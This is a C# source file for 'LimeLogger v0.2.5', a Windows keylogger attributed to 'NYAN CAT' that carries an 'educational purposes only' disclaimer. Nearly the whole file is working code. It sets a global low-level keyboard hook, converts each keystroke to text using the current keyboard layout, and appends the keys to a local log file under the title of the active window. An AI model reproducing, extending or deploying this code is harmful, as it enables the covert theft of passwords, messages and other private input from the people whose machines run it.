﻿using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;


//       │ Author     : NYAN CAT
//       │ Name       : LimeLogger v0.2.5
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.


namespace LimeLogger
{
    class Program
    {
        private static readonly string loggerPath = Application.StartupPath + @"\log.txt";
        private static string CurrentActiveWindowTitle;

        public static void Main()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            //UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WHKEYBOARDLL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool capsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                string currentKey;

                if (capsLock)
                {
                    currentKey = KeyboardLayout((uint)vkCode).ToUpper();
                }
                else
                {
                    currentKey = KeyboardLayout((uint)vkCode).ToLower();
                }

                if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                    currentKey = "[" + (Keys)vkCode + "]";

                else
                {
                    switch (((Keys)vkCode).ToString())
                    {
                        case "Space":
                            currentKey = " ";
                            //currentKey = "[SPACE]";
                            break;
                        case "Return":
                            currentKey = "[ENTER]" + Environment.NewLine;
                            break;
                        case "Escape":
                            currentKey = "[ESC]" + Environment.NewLine; ;
                            break;
                        case "LControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "LShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "Back":
                            currentKey = "[Back]";
                            break;
                        case "LWin":
                            currentKey = "[WIN]";
                            break;
                        case "Tab":
                            currentKey = "[Tab]" + Environment.NewLine;;
                            break;
                        //case "Capital":
                        //    if (capsLock == true)
                        //        currentKey = "[CAPSLOCK: OFF]";
                        //    else
                        //        currentKey = "[CAPSLOCK: ON]";
                        //    break;
                    }
                }

                using (StreamWriter sw = new StreamWriter(loggerPath, true))
                {
                    if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                    {
                        sw.Write(currentKey);
                    }
                    else
                    {
                        sw.WriteLine(Environment.NewLine);
                        sw.WriteLine($"###  {GetActiveWindowTitle()} ###");
                        sw.Write(currentKey);
                    }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch { }
            return ((Keys)vkCode).ToString();
        }

        private static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out uint pid);
                Process p = Process.GetProcessById((int)pid);
                string title = p.MainWindowTitle;
                if (string.IsNullOrWhiteSpace(title))
                    title = p.MainModule.ModuleName;
                CurrentActiveWindowTitle = title;
                return title;
            }
            catch (Exception)
            {
                return "???";
            }
        }


        #region "Hooks & Native Methods"
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        private static int WHKEYBOARDLL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);
        #endregion

    }
}
